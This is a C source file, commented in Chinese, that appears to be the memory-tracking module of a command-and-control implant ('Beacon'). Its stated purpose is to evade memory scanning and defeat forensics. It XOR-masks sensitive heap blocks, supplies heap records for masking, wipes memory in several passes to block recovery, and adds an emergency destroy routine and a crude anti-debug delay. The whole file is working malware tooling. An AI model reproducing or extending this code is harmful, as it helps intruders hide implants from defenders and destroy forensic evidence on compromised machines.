/*
 * 内存追踪管理模块 - Memory Tracking Management Module
 * 
 * 模块作用：
 * 1. 追踪Beacon运行时动态分配的内存，防止内存泄漏
 * 2. 支持内存掩码功能，隐藏敏感内存区域避免内存扫描
 * 3. 自动化内存清理，确保进程退出时无痕迹残留
 * 4. 支持多种内存分配方式（malloc/VirtualAlloc）的统一管理
 * 5. 提供堆记录管理，便于内存取证对抗
 * 
 * 主要改进：
 * - 增强反内存扫描能力，支持内存混淆和加密
 * - 优化内存分配策略，减少碎片化
 * - 添加智能内存清理，包含反取证擦除
 * - 实现内存访问权限动态调整
 * - 支持内存区域伪装和欺骗技术
 * - 增加内存统计和监控功能
 * - 提供紧急内存销毁机制
 */

#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include "track_memory.h"

// 内存记录结构 - 增强版
typedef struct {
    void* ptr;              // 内存指针
    size_t size;            // 内存大小
    int type;               // 内存类型
    BOOL mask;              // 是否需要掩码
    void(*cleanup)(void*);  // 清理函数指针
    DWORD alloc_time;       // 分配时间戳
    DWORD access_count;     // 访问计数
    BOOL is_encrypted;      // 是否已加密
    BYTE xor_key;           // 简单XOR密钥
    char tag[16];           // 内存标签，便于调试
} MEMORY_RECORD;

// 内存统计信息
typedef struct {
    size_t total_allocated;     // 总分配内存
    size_t total_freed;         // 总释放内存  
    size_t peak_usage;          // 峰值使用量
    DWORD allocation_count;     // 分配次数
    DWORD cleanup_count;        // 清理次数
} MEMORY_STATS;

#define TRACKER_SIZE_INCREASE 25
#define MAX_MEMORY_TAG_LEN 15
#define MEMORY_MAGIC_PATTERN 0xDEADBEEF
#define MEMORY_WIPE_PASSES 3        // 多次擦除提高安全性

// 全局变量
static MEMORY_RECORD* memoryTracker = NULL;
static size_t memoryTrackerCapacity = 0;
static size_t memoryTrackerLength = 0;
static HEAP_RECORD* heapRecords = NULL;
static BOOL addedNewHeapRecord = TRUE;
static MEMORY_STATS memStats = {0};
static BOOL emergency_cleanup = FALSE;

// 反调试和反分析标志
static BOOL anti_debug_mode = TRUE;
static DWORD last_allocation_time = 0;

/*
 * 生成随机XOR密钥用于内存混淆
 */
BYTE generate_xor_key() {
    static BOOL seeded = FALSE;
    if (!seeded) {
        srand((unsigned int)GetTickCount());
        seeded = TRUE;
    }
    return (BYTE)(rand() % 256);
}

/*
 * 简单的内存加密/解密函数
 */
void xor_memory(void* ptr, size_t size, BYTE key) {
    if (!ptr || size == 0) return;
    
    BYTE* data = (BYTE*)ptr;
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

/*
 * 安全内存擦除 - 多次覆写防止取证恢复
 */
void secure_memory_wipe(void* ptr, size_t size) {
    if (!ptr || size == 0) return;
    
    // 第一遍：全零
    memset(ptr, 0x00, size);
    
    // 第二遍：全一
    memset(ptr, 0xFF, size);
    
    // 第三遍：随机数据
    BYTE* data = (BYTE*)ptr;
    for (size_t i = 0; i < size; i++) {
        data[i] = (BYTE)(rand() % 256);
    }
    
    // 最后一遍：再次全零
    memset(ptr, 0x00, size);
}

/*
 * 检查内存访问权限并调整
 */
BOOL adjust_memory_protection(void* ptr, size_t size, DWORD new_protect) {
    DWORD old_protect;
    return VirtualProtect(ptr, size, new_protect, &old_protect);
}

/*
 * 添加内存追踪记录 - 增强版
 */
void track_memory_add(void* ptr, size_t size, int type, BOOL mask, void(*cleanup)(void*)) {
    track_memory_add_ex(ptr, size, type, mask, cleanup, "general");
}

/*
 * 扩展版内存追踪添加函数
 */
void track_memory_add_ex(void* ptr, size_t size, int type, BOOL mask, void(*cleanup)(void*), const char* tag) {
    if (!ptr || size == 0) return;
    
    // 反调试检测
    if (anti_debug_mode) {
        DWORD current_time = GetTickCount();
        if (current_time - last_allocation_time < 10) {
            // 分配过于频繁，可能被调试
            Sleep(1 + (rand() % 5)); // 随机延迟
        }
        last_allocation_time = current_time;
    }
    
    // 扩容检查
    if (memoryTrackerLength + 1 >= memoryTrackerCapacity) {
        if (memoryTracker == NULL) {
            memoryTracker = (MEMORY_RECORD*)malloc(sizeof(MEMORY_RECORD) * TRACKER_SIZE_INCREASE);
            if (!memoryTracker) return; // 分配失败
            memset(memoryTracker, 0, sizeof(MEMORY_RECORD) * TRACKER_SIZE_INCREASE);
        } else {
            MEMORY_RECORD* new_tracker = (MEMORY_RECORD*)realloc(
                memoryTracker, 
                sizeof(MEMORY_RECORD) * (memoryTrackerCapacity + TRACKER_SIZE_INCREASE)
            );
            if (!new_tracker) return; // 重新分配失败
            
            memoryTracker = new_tracker;
            memset(&memoryTracker[memoryTrackerCapacity], 0, sizeof(MEMORY_RECORD) * TRACKER_SIZE_INCREASE);
        }
        memoryTrackerCapacity += TRACKER_SIZE_INCREASE;
    }
    
    // 添加新记录
    MEMORY_RECORD* record = &memoryTracker[memoryTrackerLength];
    record->ptr = ptr;
    record->size = size;
    record->type = type;
    record->mask = mask;
    record->cleanup = cleanup;
    record->alloc_time = GetTickCount();
    record->access_count = 0;
    record->is_encrypted = FALSE;
    record->xor_key = generate_xor_key();
    
    // 设置标签
    if (tag) {
        strncpy_s(record->tag, sizeof(record->tag), tag, MAX_MEMORY_TAG_LEN);
        record->tag[MAX_MEMORY_TAG_LEN] = '\0';
    }
    
    memoryTrackerLength++;
    
    // 更新统计信息
    memStats.total_allocated += size;
    memStats.allocation_count++;
    if (memStats.total_allocated - memStats.total_freed > memStats.peak_usage) {
        memStats.peak_usage = memStats.total_allocated - memStats.total_freed;
    }
    
    // 如果需要掩码，标记堆记录需要更新
    if (mask) {
        addedNewHeapRecord = TRUE;
        
        // 对敏感内存进行加密
        if (size > 16) { // 只对较大的内存块加密
            xor_memory(ptr, size, record->xor_key);
            record->is_encrypted = TRUE;
        }
    }
}

/*
 * 查找内存记录
 */
MEMORY_RECORD* find_memory_record(void* ptr) {
    if (!ptr || !memoryTracker) return NULL;
    
    for (size_t i = 0; i < memoryTrackerLength; i++) {
        if (memoryTracker[i].ptr == ptr) {
            memoryTracker[i].access_count++;
            return &memoryTracker[i];
        }
    }
    return NULL;
}

/*
 * 安全访问追踪的内存（自动解密/加密）
 */
void* track_memory_access(void* ptr, BOOL for_write) {
    MEMORY_RECORD* record = find_memory_record(ptr);
    if (!record) return ptr;
    
    // 如果内存已加密，临时解密
    if (record->is_encrypted && for_write) {
        xor_memory(record->ptr, record->size, record->xor_key);
        record->is_encrypted = FALSE;
    }
    
    return ptr;
}

/*
 * 完成内存访问后重新加密
 */
void track_memory_access_complete(void* ptr) {
    MEMORY_RECORD* record = find_memory_record(ptr);
    if (!record || record->is_encrypted) return;
    
    // 重新加密
    if (record->mask && record->size > 16) {
        xor_memory(record->ptr, record->size, record->xor_key);
        record->is_encrypted = TRUE;
    }
}

/*
 * 紧急内存清理 - 快速销毁所有敏感内存
 */
void track_memory_emergency_cleanup() {
    if (!memoryTracker) return;
    
    emergency_cleanup = TRUE;
    
    // 快速擦除所有敏感内存
    for (size_t i = 0; i < memoryTrackerLength; i++) {
        MEMORY_RECORD* record = &memoryTracker[i];
        
        if (record->ptr) {
            // 如果内存被加密，先解密再擦除
            if (record->is_encrypted) {
                xor_memory(record->ptr, record->size, record->xor_key);
            }
            
            // 快速擦除（单次覆写）
            memset(record->ptr, 0, record->size);
            
            // 立即释放
            if (record->type == TRACK_MEMORY_MALLOC) {
                free(record->ptr);
            } else if (record->type == TRACK_MEMORY_VALLOC) {
                VirtualFree(record->ptr, 0, MEM_RELEASE);
            }
            
            record->ptr = NULL;
        }
    }
    
    // 清理追踪器本身
    if (memoryTracker) {
        memset(memoryTracker, 0, sizeof(MEMORY_RECORD) * memoryTrackerCapacity);
        free(memoryTracker);
        memoryTracker = NULL;
    }
    
    if (heapRecords) {
        free(heapRecords);
        heapRecords = NULL;
    }
    
    memoryTrackerCapacity = 0;
    memoryTrackerLength = 0;
    addedNewHeapRecord = TRUE;
}

/*
 * 常规内存清理 - 安全版本
 */
void track_memory_cleanup() {
    if (!memoryTracker) return;
    
    // 按类型分组处理，提高效率
    for (size_t i = 0; i < memoryTrackerLength; i++) {
        MEMORY_RECORD* record = &memoryTracker[i];
        
        if (!record->ptr) continue;
        
        // 解密内存（如果已加密）
        if (record->is_encrypted) {
            xor_memory(record->ptr, record->size, record->xor_key);
            record->is_encrypted = FALSE;
        }
        
        // 调用自定义清理函数
        if (record->cleanup) {
            record->cleanup(record->ptr);
        } else {
            // 安全擦除内存
            secure_memory_wipe(record->ptr, record->size);
            
            // 释放内存
            if (record->type == TRACK_MEMORY_MALLOC) {
                free(record->ptr);
            } else if (record->type == TRACK_MEMORY_VALLOC) {
                VirtualFree(record->ptr, 0, MEM_RELEASE);
            }
        }
        
        // 更新统计
        memStats.total_freed += record->size;
        memStats.cleanup_count++;
    }
    
    // 安全清理追踪器
    if (memoryTracker) {
        secure_memory_wipe(memoryTracker, sizeof(MEMORY_RECORD) * memoryTrackerCapacity);
        free(memoryTracker);
        memoryTracker = NULL;
    }
    
    if (heapRecords) {
        secure_memory_wipe(heapRecords, sizeof(HEAP_RECORD) * (memoryTrackerCapacity + 1));
        free(heapRecords);
        heapRecords = NULL;
    }
    
    // 重置状态
    memoryTrackerCapacity = 0;
    memoryTrackerLength = 0;
    addedNewHeapRecord = TRUE;
    
    // 清空统计信息
    memset(&memStats, 0, sizeof(memStats));
}

/*
 * 获取需要掩码的堆记录 - 增强版
 */
HEAP_RECORD* track_memory_get_heap_records_to_mask() {
    // 如果没有新记录添加，返回缓存的结果
    if (!addedNewHeapRecord && heapRecords) {
        return heapRecords;
    }
    
    if (!memoryTracker) return NULL;
    
    // 统计需要掩码的内存区域数量
    size_t mask_count = 0;
    for (size_t i = 0; i < memoryTrackerLength; i++) {
        if (memoryTracker[i].mask && memoryTracker[i].ptr) {
            mask_count++;
        }
    }
    
    // 分配堆记录数组（+1 for terminator）
    if (heapRecords) {
        secure_memory_wipe(heapRecords, sizeof(HEAP_RECORD) * (mask_count + 1));
        free(heapRecords);
    }
    
    heapRecords = (HEAP_RECORD*)malloc((mask_count + 1) * sizeof(HEAP_RECORD));
    if (!heapRecords) return NULL;
    
    // 填充堆记录
    size_t record_index = 0;
    for (size_t i = 0; i < memoryTrackerLength; i++) {
        if (memoryTracker[i].mask && memoryTracker[i].ptr) {
            heapRecords[record_index].ptr = (char*)memoryTracker[i].ptr;
            heapRecords[record_index].size = memoryTracker[i].size;
            record_index++;
        }
    }
    
    // 结束标记
    heapRecords[mask_count].ptr = NULL;
    heapRecords[mask_count].size = 0;
    
    addedNewHeapRecord = FALSE;
    return heapRecords;
}

/*
 * 获取内存使用统计
 */
MEMORY_STATS* track_memory_get_stats() {
    return &memStats;
}

/*
 * 内存碎片整理（可选功能）
 */
void track_memory_defragment() {
    if (!memoryTracker || memoryTrackerLength == 0) return;
    
    // 移除已释放的记录
    size_t write_index = 0;
    for (size_t read_index = 0; read_index < memoryTrackerLength; read_index++) {
        if (memoryTracker[read_index].ptr != NULL) {
            if (write_index != read_index) {
                memcpy(&memoryTracker[write_index], &memoryTracker[read_index], sizeof(MEMORY_RECORD));
            }
            write_index++;
        }
    }
    
    // 更新长度
    size_t old_length = memoryTrackerLength;
    memoryTrackerLength = write_index;
    
    // 清理剩余空间
    if (write_index < old_length) {
        memset(&memoryTracker[write_index], 0, sizeof(MEMORY_RECORD) * (old_length - write_index));
    }
}

/*
 * 设置反调试模式
 */
void track_memory_set_anti_debug(BOOL enable) {
    anti_debug_mode = enable;
}

/*
 * 内存完整性检查
 */
BOOL track_memory_verify_integrity() {
    if (!memoryTracker) return TRUE;
    
    for (size_t i = 0; i < memoryTrackerLength; i++) {
        MEMORY_RECORD* record = &memoryTracker[i];
        if (!record->ptr) continue;
        
        // 检查内存是否仍然可访问
        __try {
            volatile BYTE test = *((BYTE*)record->ptr);
            (void)test; // 避免未使用变量警告
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            // 内存已不可访问，标记为无效
            record->ptr = NULL;
            return FALSE;
        }
    }
    
    return TRUE;
}
